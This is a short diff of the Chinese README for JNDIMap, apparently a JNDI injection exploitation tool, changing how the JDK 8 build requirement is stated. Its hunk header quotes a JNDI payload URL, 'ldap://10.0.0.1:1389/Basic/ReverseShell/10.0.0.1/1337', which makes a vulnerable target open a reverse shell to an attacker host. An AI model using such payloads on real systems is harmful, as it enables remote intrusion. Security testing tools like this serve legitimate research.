@@ -92,9 +92,10 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 ## ⚙️ 编译
 
-[Releases](https://github.com/X1r0z/JNDIMap/releases) 包含稳定版和 snapshot 版 (基于 main 分支自动构建的最新版本), 你也可以在使用时拉取源码自行编译 (基于 JDK 8)
+[Releases](https://github.com/X1r0z/JNDIMap/releases) 包含稳定版和 snapshot 版 (基于 main 分支自动构建的最新版本), 你也可以在使用时拉取源码自行编译
 
 ```bash
+# JDK 8+
 git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
 mvn package -Dmaven.test.skip=true
 ```
